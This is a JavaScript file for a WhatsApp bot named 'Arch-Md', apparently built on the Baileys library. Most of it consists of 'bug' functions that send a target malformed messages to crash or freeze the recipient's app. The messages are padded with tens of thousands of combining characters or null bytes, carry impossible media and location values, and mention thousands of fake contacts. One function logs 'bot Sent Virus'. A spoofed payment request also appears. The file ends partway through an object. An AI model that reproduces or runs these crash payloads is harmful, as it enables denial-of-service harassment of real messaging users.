
const fs = require('fs');
const path = require('path');
const util = require('util');
const Jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const crypto = require('crypto');
const FileType = require('file-type');
const moment = require('moment-timezone');
const { defaultMaxListeners } = require('stream');
const { sizeFormatter } = require('human-readable');
const { jidNormalizedUser, proto, getBinaryNodeChildren, getBinaryNodeChild, generateWAMessageContent, generateForwardMessageContent, prepareWAMessageMedia, delay, areJidsSameUser, extractMessageContent, generateMessageID, downloadContentFromMessage, generateWAMessageFromContent, jidDecode, generateWAMessage, toBuffer, getContentType, getDevice } = require('@whiskeysockets/baileys');
const { Serialize } = require('../source/message');
const msg = message.messages[0];
const m = Serialize(msg, store);
const from = m.key.remoteJid
	
			// Fake Quoted //
 	const nullgb = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
            },
            message: {
            documentMessage: {
                contactVcard: true
              }
            }
        };
    
    
	const xpaytod = (teks) => {
			var paymentod = {
				requestPaymentMessage: {
					currencyCodeIso4217: 'USD',
					amount1000: 9000000 * 1000,
					requestFrom: m.sender,
					noteMessage: {
						extendedTextMessage: {
							text: teks,
							contextInfo: {
								mentionedJid: [],
								groupMentions: [],
								isForwarded: true,
								fromMe: false,
								forwardedNewsletterMessageInfo: {
									newsletterJid: '120363333509194874@newsletter',
									newsletterName: "Arch Md crash ",
									serverMessageId: -1
								},
								externalAdReply: {
									showAdAttribution: false
								}
							}
						}
					}
				}
			}
			ednut.relayMessage(m.chat, paymentod, {})
		}
	
const {
xinhaha
} = require("./ip.js")
		// dll !! //
function generateTrxId() {
const digits = Math.floor(10000 + Math.random() * 90000);
const letters = String.fromCharCode(65 + Math.floor(Math.random() * 26)) + 
String.fromCharCode(65 + Math.floor(Math.random() * 26)) +
String.fromCharCode(65 + Math.floor(Math.random() * 26));
const trxid = `fid${digits}${letters}`;
return trxid;
}


function randomNumber() {
const digits = [];
while (digits.length < 6) {
const randomDigit = Math.floor(Math.random() * 10);
if (!digits.includes(randomDigit)) {
digits.push(randomDigit);
}
}
return digits.join("");
}

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

function formatTanggal(tanggal) {
const options = { year: 'numeric', month: 'long', day: 'numeric' };
return tanggal.toLocaleDateString('id-ID', options);
}

const transaksiFilePath = path.join(__dirname, 'all', 'database', 'transaksi.json');

async function saveTransaction(barang, harga, tanggal) {
try {
let transaksiData = [];
if (fs.existsSync(transaksiFilePath)) {
transaksiData = JSON.parse(await fs.promises.readFile(transaksiFilePath));
}
transaksiData.push({ barang, harga, tanggal });
await fs.promises.writeFile(transaksiFilePath, JSON.stringify(transaksiData, null, 2));
} catch (error) {
console.error("Error saving transaction:", error);
}
}

async function readTransactions() {
try {
if (fs.existsSync(transaksiFilePath)) {
return JSON.parse(await fs.promises.readFile(transaksiFilePath));
} else {
return [];
}
} catch (err) {
console.error('Error reading transactions:', err);
return [];
}
}		
				
		
async function CDG(bugtarg, ptcp = false) {
    let FQT = "@1".repeat(50) + "꧀".repeat(50000);
    await ednut.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "➛̽͢♦️̟̈́̈́͜₳Ɽ₵Ⱨ ₥Đᝄ̭͖͢͝ ̈́䒘͖͙̽͢͝",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: FQT
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Arch-Md" }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}
    async function Stadoc(bugtarg, ptcp = false) {
      let Floodz = {
        key: {
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
        },
        message: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            mimetype:
              "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "999999999",
            pageCount: 0x9184e729fff,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: " 🖕🏼 ",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath:
              "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1715880173",
            contactVcard: true,
          },
        },
      };

      await ednut.sendMessage(bugtarg, { text: "hi" }, { quoted: Floodz });
    }
        
        async function MissYou(bugtarg, ptcp = false) {
      await ednut.relayMessage(
        bugtarg,
        {
          extendedTextMessage: {
            text: "ednut " + "ꦾ".repeat(50000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: bugtarg,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
               title: "🦇 - Crashed - ¿ ! ",
                body: "❗",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Ednut_x",
                mediaUrl: "https://t.me/Ednut_x",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/htmlxin",
              },
              groupSubject: "ednutbot",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        ptcp
          ? {
              participant: {
                jid: bugtarg,
              },
            }
          : {}
      );
    }
    
   async function Jade(bugtarg, ptcp = true) {
      let FlashD = "🟣" + "𑇂𑆵𑆴𑆿".repeat(50000);
     await ednut.relayMessage(
        bugtarg,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: FlashD,
            url: "https://t.me/html",
          },
        },
        {
          participant: {
            jid: bugtarg,
          },
        }
      );
    }
    
      async function Dexter(bugtarg, ptcp = false) {
      var etc = generateWAMessageFromContent(
        bugtarg,
        proto.Message.fromObject({
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "o9LrGTJaHdYVWZF2UEN5RRap2JMkamsjYfs3ZPfpB4A=",
            fileLength: "236989",
            seconds: 18,
            mediaKey: "8SePyblqpUmoGyb3BP/5nAd3jydoH9HU8YZVDe/VWlU=",
            caption: xinhaha,
            height: 99999,
            width: 99999,
            fileEncSha256: "ABMHTzddlN1NzTAug/7LXAMrA22yJCdnhQTXoLDXQJ0=",
            directPath:
              "/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&_nc_hot=1730912455",
            mediaKeyTimestamp: "1730912449",
            jpegThumbnail:
              "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",
            streamingSidecar:
              "4PsGNVYL/bmKyy08TD4HRhVW/0B13syEWleRiLNIS+fPsl4I+Z5KdQ==",
            thumbnailDirectPath:
              "/v/t62.36147-24/11857855_1866356897224917_5456418343720550181_n.enc?ccb=11-4&oh=01_Q5AaIGWYh_Y1n1Q2SsCfDeAxseMvFXviOu8el3g2MzEHbNmI&oe=67531880&_nc_sid=5e03e0",
            thumbnailSha256: "mKU5Li0YYWvtFT5s6fLFLeqU5hESEVzIYWnNcgenNyY=",
            thumbnailEncSha256: "ydInxyQkYy+CPu6KAmtjLm6z9O06ATgiiAw/zcHQ/Ts=",
          },
        }),
        { userJid: bugtarg, quoted: m }
      );
      await ednut.relayMessage(bugtarg, etc.message, {
        participant: { jid: bugtarg },
        messageId: etc.key.id,
      });
    }
                   
 async function Frz(bugtarg, ptcp = false) {
    await ednut.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "A̸r̸c̸h̸𝐖̽𝐚͖̽𝐬̽͜𝐇𝐞͙̟̽̽𝐫𝐞̭̽" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}


 		async function CastD(bugtarg, ptcp = false) {
			await ednut.relayMessage(bugtarg, {
					extendedTextMessage: {
						text: "‎Killed By ednut\n" + " *~@0~* ".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: bugtarg,
							conversionSource: " p ",
							conversionData: " p ",
							conversionDelaySeconds: 30,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: " p ",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: bugtarg
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅"));
		};
      

const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Arch-Md",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    async function IosMJ(target, Ptcp = false) {
      await ednut.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Arch - CALL" + "\u0000".repeat(50000),
                body: "𝗔𝗿𝗰𝗵 𝐊𝐢𝐥𝐥⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
